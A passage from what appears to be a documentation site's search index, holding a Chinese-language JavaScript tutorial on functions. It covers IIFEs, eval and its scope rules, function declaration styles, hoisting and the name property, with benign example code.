\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u90fd\u662f\u4ee5\u5706\u62ec\u53f7\u5f00\u5934\uff0c\u5f15\u64ce\u5c31\u4f1a\u8ba4\u4e3a\u540e\u9762\u8ddf\u7684\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u800c\u4e0d\u662f\u51fd\u6570\u5b9a\u4e49\u8bed\u53e5\uff0c\u6240\u4ee5\u5c31\u907f\u514d\u4e86\u9519\u8bef\u3002\u8fd9\u5c31\u53eb\u505a\u201c\u7acb\u5373\u8c03\u7528\u7684\u51fd\u6570\u8868\u8fbe\u5f0f\u201d\uff08Immediately-Invoked Function Expression\uff09\uff0c\u7b80\u79f0 IIFE\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u6700\u540e\u7684\u5206\u53f7\u90fd\u662f\u5fc5\u987b\u7684\u3002\u5982\u679c\u7701\u7565\u5206\u53f7\uff0c\u9047\u5230\u8fde\u7740\u4e24\u4e2a IIFE\uff0c\u53ef\u80fd\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 // \u62a5\u9519 ( function (){ /* code */ }()) ( function (){ /* code */ }()) \u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u884c\u4e4b\u95f4\u6ca1\u6709\u5206\u53f7\uff0cJavaScript \u4f1a\u5c06\u5b83\u4eec\u8fde\u5728\u4e00\u8d77\u89e3\u91ca\uff0c\u5c06\u7b2c\u4e8c\u884c\u89e3\u91ca\u4e3a\u7b2c\u4e00\u884c\u7684\u53c2\u6570\u3002 \u63a8\u800c\u5e7f\u4e4b\uff0c\u4efb\u4f55\u8ba9\u89e3\u91ca\u5668\u4ee5\u8868\u8fbe\u5f0f\u6765\u5904\u7406\u51fd\u6570\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u90fd\u80fd\u4ea7\u751f\u540c\u6837\u7684\u6548\u679c\uff0c\u6bd4\u5982\u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u3002 1 2 3 var i = function (){ return 10 ; }(); true && function (){ /* code */ }(); 0 , function (){ /* code */ }(); \u751a\u81f3\u50cf\u4e0b\u9762\u8fd9\u6837\u5199\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 1 2 3 4 ! function () { /* code */ }(); ~ function () { /* code */ }(); - function () { /* code */ }(); + function () { /* code */ }(); \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u53ea\u5bf9\u533f\u540d\u51fd\u6570\u4f7f\u7528\u8fd9\u79cd\u201c\u7acb\u5373\u6267\u884c\u7684\u51fd\u6570\u8868\u8fbe\u5f0f\u201d\u3002\u5b83\u7684\u76ee\u7684\u6709\u4e24\u4e2a\uff1a\u4e00\u662f\u4e0d\u5fc5\u4e3a\u51fd\u6570\u547d\u540d\uff0c\u907f\u514d\u4e86\u6c61\u67d3\u5168\u5c40\u53d8\u91cf\uff1b\u4e8c\u662f IIFE \u5185\u90e8\u5f62\u6210\u4e86\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff0c\u53ef\u4ee5\u5c01\u88c5\u4e00\u4e9b\u5916\u90e8\u65e0\u6cd5\u8bfb\u53d6\u7684\u79c1\u6709\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u5199\u6cd5\u4e00 var tmp = newData ; processData ( tmp ); storeData ( tmp ); // \u5199\u6cd5\u4e8c ( function () { var tmp = newData ; processData ( tmp ); storeData ( tmp ); }()); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u6cd5\u4e8c\u6bd4\u5199\u6cd5\u4e00\u66f4\u597d\uff0c\u56e0\u4e3a\u5b8c\u5168\u907f\u514d\u4e86\u6c61\u67d3\u5168\u5c40\u53d8\u91cf\u3002 eval \u547d\u4ee4 \u00b6 \u57fa\u672c\u7528\u6cd5 \u00b6 eval \u547d\u4ee4\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u5e76\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5f53\u4f5c\u8bed\u53e5\u6267\u884c\u3002 1 2 eval ( 'var a = 1;' ); a // 1 \u4e0a\u9762\u4ee3\u7801\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u8bed\u53e5\u8fd0\u884c\uff0c\u751f\u6210\u4e86\u53d8\u91cf a \u3002 \u5982\u679c\u53c2\u6570\u5b57\u7b26\u4e32\u65e0\u6cd5\u5f53\u4f5c\u8bed\u53e5\u8fd0\u884c\uff0c\u90a3\u4e48\u5c31\u4f1a\u62a5\u9519\u3002 1 eval ( '3x' ) // Uncaught SyntaxError: Invalid or unexpected token \u653e\u5728 eval \u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u5e94\u8be5\u6709\u72ec\u81ea\u5b58\u5728\u7684\u610f\u4e49\uff0c\u4e0d\u80fd\u7528\u6765\u4e0e eval \u4ee5\u5916\u7684\u547d\u4ee4\u914d\u5408\u4f7f\u7528\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u5c06\u4f1a\u62a5\u9519\u3002 1 eval ( 'return;' ); // Uncaught SyntaxError: Illegal return statement \u4e0a\u9762\u4ee3\u7801\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a return \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u5fc5\u987b\u5728\u51fd\u6570\u4e2d\u4f7f\u7528\u3002 \u5982\u679c eval \u7684\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u4f1a\u539f\u6837\u8fd4\u56de\u3002 1 eval ( 123 ) // 123 eval \u6ca1\u6709\u81ea\u5df1\u7684\u4f5c\u7528\u57df\uff0c\u90fd\u5728\u5f53\u524d\u4f5c\u7528\u57df\u5185\u6267\u884c\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u4fee\u6539\u5f53\u524d\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u7684\u503c\uff0c\u9020\u6210\u5b89\u5168\u95ee\u9898\u3002 1 2 3 4 var a = 1 ; eval ( 'a = 2' ); a // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c eval \u547d\u4ee4\u4fee\u6539\u4e86\u5916\u90e8\u53d8\u91cf a \u7684\u503c\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c eval \u6709\u5b89\u5168\u98ce\u9669\u3002 \u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u98ce\u9669\uff0cJavaScript \u89c4\u5b9a\uff0c\u5982\u679c\u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\uff0c eval \u5185\u90e8\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u5916\u90e8\u4f5c\u7528\u57df\u3002 1 2 3 4 5 ( function f () { 'use strict' ; eval ( 'var foo = 123' ); console . log ( foo ); // ReferenceError: foo is not defined })() \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u5185\u90e8\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u65f6 eval \u5185\u90e8\u58f0\u660e\u7684 foo \u53d8\u91cf\uff0c\u5c31\u4e0d\u4f1a\u5f71\u54cd\u5230\u5916\u90e8\u3002 \u4e0d\u8fc7\uff0c\u5373\u4f7f\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c eval \u4f9d\u7136\u53ef\u4ee5\u8bfb\u5199\u5f53\u524d\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u3002 1 2 3 4 5 6 ( function f () { 'use strict' ; var foo = 1 ; eval ( 'foo = 2' ); console . log ( foo ); // 2 })() \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c eval \u5185\u90e8\u8fd8\u662f\u6539\u5199\u4e86\u5916\u90e8\u53d8\u91cf\uff0c\u53ef\u89c1\u5b89\u5168\u98ce\u9669\u4f9d\u7136\u5b58\u5728\u3002 \u603b\u4e4b\uff0c eval \u7684\u672c\u8d28\u662f\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e4b\u4e2d\uff0c\u6ce8\u5165\u4ee3\u7801\u3002\u7531\u4e8e\u5b89\u5168\u98ce\u9669\u548c\u4e0d\u5229\u4e8e JavaScript \u5f15\u64ce\u4f18\u5316\u6267\u884c\u901f\u5ea6\uff0c\u4e00\u822c\u4e0d\u63a8\u8350\u4f7f\u7528\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c eval \u6700\u5e38\u89c1\u7684\u573a\u5408\u662f\u89e3\u6790 JSON \u6570\u636e\u7684\u5b57\u7b26\u4e32\uff0c\u4e0d\u8fc7\u6b63\u786e\u7684\u505a\u6cd5\u5e94\u8be5\u662f\u4f7f\u7528\u539f\u751f\u7684 JSON.parse \u65b9\u6cd5\u3002 eval \u7684\u522b\u540d\u8c03\u7528 \u00b6 \u524d\u9762\u8bf4\u8fc7 eval \u4e0d\u5229\u4e8e\u5f15\u64ce\u4f18\u5316\u6267\u884c\u901f\u5ea6\u3002\u66f4\u9ebb\u70e6\u7684\u662f\uff0c\u8fd8\u6709\u4e0b\u9762\u8fd9\u79cd\u60c5\u51b5\uff0c\u5f15\u64ce\u5728\u9759\u6001\u4ee3\u7801\u5206\u6790\u7684\u9636\u6bb5\uff0c\u6839\u672c\u65e0\u6cd5\u5206\u8fa8\u6267\u884c\u7684\u662f eval \u3002 1 2 3 var m = eval ; m ( 'var x = 1' ); x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf m \u662f eval \u7684\u522b\u540d\u3002\u9759\u6001\u4ee3\u7801\u5206\u6790\u9636\u6bb5\uff0c\u5f15\u64ce\u5206\u8fa8\u4e0d\u51fa m('var x = 1') \u6267\u884c\u7684\u662f eval \u547d\u4ee4\u3002 \u4e3a\u4e86\u4fdd\u8bc1 eval \u7684\u522b\u540d\u4e0d\u5f71\u54cd\u4ee3\u7801\u4f18\u5316\uff0cJavaScript \u7684\u6807\u51c6\u89c4\u5b9a\uff0c\u51e1\u662f\u4f7f\u7528\u522b\u540d\u6267\u884c eval \uff0c eval \u5185\u90e8\u4e00\u5f8b\u662f\u5168\u5c40\u4f5c\u7528\u57df\u3002 1 2 3 4 5 6 7 8 9 var a = 1 ; function f () { var a = 2 ; var e = eval ; e ( 'console.log(a)' ); } f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c eval \u662f\u522b\u540d\u8c03\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u5b83\u662f\u5728\u51fd\u6570\u4e2d\uff0c\u5b83\u7684\u4f5c\u7528\u57df\u8fd8\u662f\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u56e0\u6b64\u8f93\u51fa\u7684 a \u4e3a\u5168\u5c40\u53d8\u91cf\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5f15\u64ce\u5c31\u80fd\u786e\u8ba4 e() \u4e0d\u4f1a\u5bf9\u5f53\u524d\u7684\u51fd\u6570\u4f5c\u7528\u57df\u4ea7\u751f\u5f71\u54cd\uff0c\u4f18\u5316\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u628a\u8fd9\u4e00\u884c\u6392\u9664\u6389\u3002 eval \u7684\u522b\u540d\u8c03\u7528\u7684\u5f62\u5f0f\u4e94\u82b1\u516b\u95e8\uff0c\u53ea\u8981\u4e0d\u662f\u76f4\u63a5\u8c03\u7528\uff0c\u90fd\u5c5e\u4e8e\u522b\u540d\u8c03\u7528\uff0c\u56e0\u4e3a\u5f15\u64ce\u53ea\u80fd\u5206\u8fa8 eval() \u8fd9\u4e00\u79cd\u5f62\u5f0f\u662f\u76f4\u63a5\u8c03\u7528\u3002 1 2 3 4 eval . call ( null , '...' ) window . eval ( '...' ) ( 1 , eval )( '...' ) ( eval , eval )( '...' ) \u4e0a\u9762\u8fd9\u4e9b\u5f62\u5f0f\u90fd\u662f eval \u7684\u522b\u540d\u8c03\u7528\uff0c\u4f5c\u7528\u57df\u90fd\u662f\u5168\u5c40\u4f5c\u7528\u57df\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Ben Alman, Immediately-Invoked Function Expression (IIFE) Mark Daggett, Functions Explained Juriy Zaytsev, Named function expressions demystified Marco Rogers polotek, What is the arguments object? Juriy Zaytsev, Global eval. What are the options? Axel Rauschmayer, Evaluating JavaScript code via eval() and new Function()","title":"\u51fd\u6570"},{"location":"types/function/#_1","text":"\u51fd\u6570\u662f\u4e00\u6bb5\u53ef\u4ee5\u53cd\u590d\u8c03\u7528\u7684\u4ee3\u7801\u5757\u3002\u51fd\u6570\u8fd8\u80fd\u63a5\u53d7\u8f93\u5165\u7684\u53c2\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u503c\u3002","title":"\u51fd\u6570"},{"location":"types/function/#_2","text":"","title":"\u6982\u8ff0"},{"location":"types/function/#_3","text":"JavaScript \u6709\u4e09\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u6cd5\u3002 \uff081\uff09function \u547d\u4ee4 function \u547d\u4ee4\u58f0\u660e\u7684\u4ee3\u7801\u533a\u5757\uff0c\u5c31\u662f\u4e00\u4e2a\u51fd\u6570\u3002 function \u547d\u4ee4\u540e\u9762\u662f\u51fd\u6570\u540d\uff0c\u51fd\u6570\u540d\u540e\u9762\u662f\u4e00\u5bf9\u5706\u62ec\u53f7\uff0c\u91cc\u9762\u662f\u4f20\u5165\u51fd\u6570\u7684\u53c2\u6570\u3002\u51fd\u6570\u4f53\u653e\u5728\u5927\u62ec\u53f7\u91cc\u9762\u3002 1 2 3 function print ( s ) { console . log ( s ); } \u4e0a\u9762\u7684\u4ee3\u7801\u547d\u540d\u4e86\u4e00\u4e2a print \u51fd\u6570\uff0c\u4ee5\u540e\u4f7f\u7528 print() \u8fd9\u79cd\u5f62\u5f0f\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u76f8\u5e94\u7684\u4ee3\u7801\u3002\u8fd9\u53eb\u505a\u51fd\u6570\u7684\u58f0\u660e\uff08Function Declaration\uff09\u3002 \uff082\uff09\u51fd\u6570\u8868\u8fbe\u5f0f \u9664\u4e86\u7528 function \u547d\u4ee4\u58f0\u660e\u51fd\u6570\uff0c\u8fd8\u53ef\u4ee5\u91c7\u7528\u53d8\u91cf\u8d4b\u503c\u7684\u5199\u6cd5\u3002 1 2 3 var print = function ( s ) { console . log ( s ); }; \u8fd9\u79cd\u5199\u6cd5\u5c06\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u53d8\u91cf\u3002\u8fd9\u65f6\uff0c\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u53c8\u79f0\u51fd\u6570\u8868\u8fbe\u5f0f\uff08Function Expression\uff09\uff0c\u56e0\u4e3a\u8d4b\u503c\u8bed\u53e5\u7684\u7b49\u53f7\u53f3\u4fa7\u53ea\u80fd\u653e\u8868\u8fbe\u5f0f\u3002 \u91c7\u7528\u51fd\u6570\u8868\u8fbe\u5f0f\u58f0\u660e\u51fd\u6570\u65f6\uff0c function \u547d\u4ee4\u540e\u9762\u4e0d\u5e26\u6709\u51fd\u6570\u540d\u3002\u5982\u679c\u52a0\u4e0a\u51fd\u6570\u540d\uff0c\u8be5\u51fd\u6570\u540d\u53ea\u5728\u51fd\u6570\u4f53\u5185\u90e8\u6709\u6548\uff0c\u5728\u51fd\u6570\u4f53\u5916\u90e8\u65e0\u6548\u3002 1 2 3 4 5 6 7 8 9 var print = function x (){ console . log ( typeof x ); }; x // ReferenceError: x is not defined print () // function \u4e0a\u9762\u4ee3\u7801\u5728\u51fd\u6570\u8868\u8fbe\u5f0f\u4e2d\uff0c\u52a0\u5165\u4e86\u51fd\u6570\u540d x \u3002\u8fd9\u4e2a x \u53ea\u5728\u51fd\u6570\u4f53\u5185\u90e8\u53ef\u7528\uff0c\u6307\u4ee3\u51fd\u6570\u8868\u8fbe\u5f0f\u672c\u8eab\uff0c\u5176\u4ed6\u5730\u65b9\u90fd\u4e0d\u53ef\u7528\u3002\u8fd9\u79cd\u5199\u6cd5\u7684\u7528\u5904\u6709\u4e24\u4e2a\uff0c\u4e00\u662f\u53ef\u4ee5\u5728\u51fd\u6570\u4f53\u5185\u90e8\u8c03\u7528\u81ea\u8eab\uff0c\u4e8c\u662f\u65b9\u4fbf\u9664\u9519\uff08\u9664\u9519\u5de5\u5177\u663e\u793a\u51fd\u6570\u8c03\u7528\u6808\u65f6\uff0c\u5c06\u663e\u793a\u51fd\u6570\u540d\uff0c\u800c\u4e0d\u518d\u663e\u793a\u8fd9\u91cc\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff09\u3002\u56e0\u6b64\uff0c\u4e0b\u9762\u7684\u5f62\u5f0f\u58f0\u660e\u51fd\u6570\u4e5f\u975e\u5e38\u5e38\u89c1\u3002 1 var f = function f () {}; \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u7684\u8868\u8fbe\u5f0f\u9700\u8981\u5728\u8bed\u53e5\u7684\u7ed3\u5c3e\u52a0\u4e0a\u5206\u53f7\uff0c\u8868\u793a\u8bed\u53e5\u7ed3\u675f\u3002\u800c\u51fd\u6570\u7684\u58f0\u660e\u5728\u7ed3\u5c3e\u7684\u5927\u62ec\u53f7\u540e\u9762\u4e0d\u7528\u52a0\u5206\u53f7\u3002\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u5f0f\uff0c\u5dee\u522b\u5f88\u7ec6\u5fae\uff0c\u53ef\u4ee5\u8fd1\u4f3c\u8ba4\u4e3a\u662f\u7b49\u4ef7\u7684\u3002 \uff083\uff09Function \u6784\u9020\u51fd\u6570 \u7b2c\u4e09\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u5f0f\u662f Function \u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 var add = new Function ( 'x' , 'y' , 'return x + y' ); // \u7b49\u540c\u4e8e function add ( x , y ) { return x + y ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Function \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u9664\u4e86\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u662f add \u51fd\u6570\u7684\u201c\u51fd\u6570\u4f53\u201d\uff0c\u5176\u4ed6\u53c2\u6570\u90fd\u662f add \u51fd\u6570\u7684\u53c2\u6570\u3002 \u4f60\u53ef\u4ee5\u4f20\u9012\u4efb\u610f\u6570\u91cf\u7684\u53c2\u6570\u7ed9 Function \u6784\u9020\u51fd\u6570\uff0c\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u4f1a\u88ab\u5f53\u505a\u51fd\u6570\u4f53\uff0c\u5982\u679c\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u5c31\u662f\u51fd\u6570\u4f53\u3002 1 2 3 4 5 6 7 8 var foo = new Function ( 'return \"hello world\";' ); // \u7b49\u540c\u4e8e function foo () { return 'hello world' ; } Function \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u4e0d\u4f7f\u7528 new \u547d\u4ee4\uff0c\u8fd4\u56de\u7ed3\u679c\u5b8c\u5168\u4e00\u6837\u3002 \u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u5f0f\u975e\u5e38\u4e0d\u76f4\u89c2\uff0c\u51e0\u4e4e\u65e0\u4eba\u4f7f\u7528\u3002","title":"\u51fd\u6570\u7684\u58f0\u660e"},{"location":"types/function/#_4","text":"\u5982\u679c\u540c\u4e00\u4e2a\u51fd\u6570\u88ab\u591a\u6b21\u58f0\u660e\uff0c\u540e\u9762\u7684\u58f0\u660e\u5c31\u4f1a\u8986\u76d6\u524d\u9762\u7684\u58f0\u660e\u3002 1 2 3 4 5 6 7 8 9 function f () { console . log ( 1 ); } f () // 2 function f () { console . log ( 2 ); } f () // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540e\u4e00\u6b21\u7684\u51fd\u6570\u58f0\u660e\u8986\u76d6\u4e86\u524d\u9762\u4e00\u6b21\u3002\u800c\u4e14\uff0c\u7531\u4e8e\u51fd\u6570\u540d\u7684\u63d0\u5347\uff08\u53c2\u89c1\u4e0b\u6587\uff09\uff0c\u524d\u4e00\u6b21\u58f0\u660e\u5728\u4efb\u4f55\u65f6\u5019\u90fd\u662f\u65e0\u6548\u7684\uff0c\u8fd9\u4e00\u70b9\u8981\u7279\u522b\u6ce8\u610f\u3002","title":"\u51fd\u6570\u7684\u91cd\u590d\u58f0\u660e"},{"location":"types/function/#return","text":"\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u8981\u4f7f\u7528\u5706\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u53ef\u4ee5\u52a0\u5165\u51fd\u6570\u7684\u53c2\u6570\u3002 1 2 3 4 5 function add ( x , y ) { return x + y ; } add ( 1 , 1 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u540d\u540e\u9762\u7d27\u8ddf\u4e00\u5bf9\u5706\u62ec\u53f7\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 \u51fd\u6570\u4f53\u5185\u90e8\u7684 return \u8bed\u53e5\uff0c\u8868\u793a\u8fd4\u56de\u3002JavaScript \u5f15\u64ce\u9047\u5230 return \u8bed\u53e5\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de return \u540e\u9762\u7684\u90a3\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u540e\u9762\u5373\u4f7f\u8fd8\u6709\u8bed\u53e5\uff0c\u4e5f\u4e0d\u4f1a\u5f97\u5230\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c return \u8bed\u53e5\u6240\u5e26\u7684\u90a3\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5c31\u662f\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002 return \u8bed\u53e5\u4e0d\u662f\u5fc5\u9700\u7684\uff0c\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u8be5\u51fd\u6570\u5c31\u4e0d\u8fd4\u56de\u4efb\u4f55\u503c\uff0c\u6216\u8005\u8bf4\u8fd4\u56de undefined \u3002 \u51fd\u6570\u53ef\u4ee5\u8c03\u7528\u81ea\u8eab\uff0c\u8fd9\u5c31\u662f\u9012\u5f52\uff08recursion\uff09\u3002\u4e0b\u9762\u5c31\u662f\u901a\u8fc7\u9012\u5f52\uff0c\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 function fib ( num ) { if ( num === 0 ) return 0 ; if ( num === 1 ) return 1 ; return fib ( num - 2 ) + fib ( num - 1 ); } fib ( 6 ) // 8 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c fib \u51fd\u6570\u5185\u90e8\u53c8\u8c03\u7528\u4e86 fib \uff0c\u8ba1\u7b97\u5f97\u5230\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u7b2c6\u4e2a\u5143\u7d20\u662f8\u3002","title":"\u5706\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0creturn \u8bed\u53e5\u548c\u9012\u5f52"},{"location":"types/function/#_5","text":"JavaScript \u8bed\u8a00\u5c06\u51fd\u6570\u770b\u4f5c\u4e00\u79cd\u503c\uff0c\u4e0e\u5176\u5b83\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u7b49\u7b49\uff09\u5730\u4f4d\u76f8\u540c\u3002\u51e1\u662f\u53ef\u4ee5\u4f7f\u7528\u503c\u7684\u5730\u65b9\uff0c\u5c31\u80fd\u4f7f\u7528\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u53ef\u4ee5\u628a\u51fd\u6570\u8d4b\u503c\u7ed9\u53d8\u91cf\u548c\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u53c2\u6570\u4f20\u5165\u5176\u4ed6\u51fd\u6570\uff0c\u6216\u8005\u4f5c\u4e3a\u51fd\u6570\u7684\u7ed3\u679c\u8fd4\u56de\u3002\u51fd\u6570\u53ea\u662f\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u503c\uff0c\u6b64\u5916\u5e76\u65e0\u7279\u6b8a\u4e4b\u5904\u3002 \u7531\u4e8e\u51fd\u6570\u4e0e\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u5730\u4f4d\u5e73\u7b49\uff0c\u6240\u4ee5\u5728 JavaScript \u8bed\u8a00\u4e2d\u53c8\u79f0\u51fd\u6570\u4e3a\u7b2c\u4e00\u7b49\u516c\u6c11\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function add ( x , y ) { return x + y ; } // \u5c06\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf var operator = add ; // \u5c06\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u548c\u8fd4\u56de\u503c function a ( op ){ return op ; } a ( add )( 1 , 1 ) // 2","title":"\u7b2c\u4e00\u7b49\u516c\u6c11"},{"location":"types/function/#_6","text":"JavaScript \u5f15\u64ce\u5c06\u51fd\u6570\u540d\u89c6\u540c\u53d8\u91cf\u540d\uff0c\u6240\u4ee5\u91c7\u7528 function \u547d\u4ee4\u58f0\u660e\u51fd\u6570\u65f6\uff0c\u6574\u4e2a\u51fd\u6570\u4f1a\u50cf\u53d8\u91cf\u58f0\u660e\u4e00\u6837\uff0c\u88ab\u63d0\u5347\u5230\u4ee3\u7801\u5934\u90e8\u3002\u6240\u4ee5\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\u3002 1 2 3 f (); function f () {} \u8868\u9762\u4e0a\uff0c\u4e0a\u9762\u4ee3\u7801\u597d\u50cf\u5728\u58f0\u660e\u4e4b\u524d\u5c31\u8c03\u7528\u4e86\u51fd\u6570 f \u3002\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u201c\u53d8\u91cf\u63d0\u5347\u201d\uff0c\u51fd\u6570 f \u88ab\u63d0\u5347\u5230\u4e86\u4ee3\u7801\u5934\u90e8\uff0c\u4e5f\u5c31\u662f\u5728\u8c03\u7528\u4e4b\u524d\u5df2\u7ecf\u58f0\u660e\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u91c7\u7528\u8d4b\u503c\u8bed\u53e5\u5b9a\u4e49\u51fd\u6570\uff0cJavaScript \u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 f (); var f = function (){}; // TypeError: undefined is not a function \u4e0a\u9762\u7684\u4ee3\u7801\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5f62\u5f0f\u3002 1 2 3 var f ; f (); f = function () {}; \u4e0a\u9762\u4ee3\u7801\u7b2c\u4e8c\u884c\uff0c\u8c03\u7528 f \u7684\u65f6\u5019\uff0c f \u53ea\u662f\u88ab\u58f0\u660e\u4e86\uff0c\u8fd8\u6ca1\u6709\u88ab\u8d4b\u503c\uff0c\u7b49\u4e8e undefined \uff0c\u6240\u4ee5\u4f1a\u62a5\u9519\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u50cf\u4e0b\u9762\u4f8b\u5b50\u90a3\u6837\uff0c\u91c7\u7528 function \u547d\u4ee4\u548c var \u8d4b\u503c\u8bed\u53e5\u58f0\u660e\u540c\u4e00\u4e2a\u51fd\u6570\uff0c\u7531\u4e8e\u5b58\u5728\u51fd\u6570\u63d0\u5347\uff0c\u6700\u540e\u4f1a\u91c7\u7528 var \u8d4b\u503c\u8bed\u53e5\u7684\u5b9a\u4e49\u3002 1 2 3 4 5 6 7 8 9 var f = function () { console . log ( '1' ); } function f () { console . log ( '2' ); } f () // 1 \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u8868\u9762\u4e0a\u540e\u9762\u58f0\u660e\u7684\u51fd\u6570 f \uff0c\u5e94\u8be5\u8986\u76d6\u524d\u9762\u7684 var \u8d4b\u503c\u8bed\u53e5\uff0c\u4f46\u662f\u7531\u4e8e\u5b58\u5728\u51fd\u6570\u63d0\u5347\uff0c\u5b9e\u9645\u4e0a\u6b63\u597d\u53cd\u8fc7\u6765\u3002","title":"\u51fd\u6570\u540d\u7684\u63d0\u5347"},{"location":"types/function/#_7","text":"","title":"\u51fd\u6570\u7684\u5c5e\u6027\u548c\u65b9\u6cd5"},{"location":"types/function/#name","text":"\u51fd\u6570\u7684 name \u5c5e\u6027\u8fd4\u56de\u51fd\u6570\u7684\u540d\u5b57\u3002 1 2 function f1 () {} f1 . name // \"f1\" \u5982\u679c\u662f\u901a\u8fc7\u53d8\u91cf\u8d4b\u503c\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u90a3\u4e48 name \u5c5e\u6027\u8fd4\u56de\u53d8\u91cf\u540d\u3002 1 2 var f2 = function () {}; f2 . name // \"f2\" 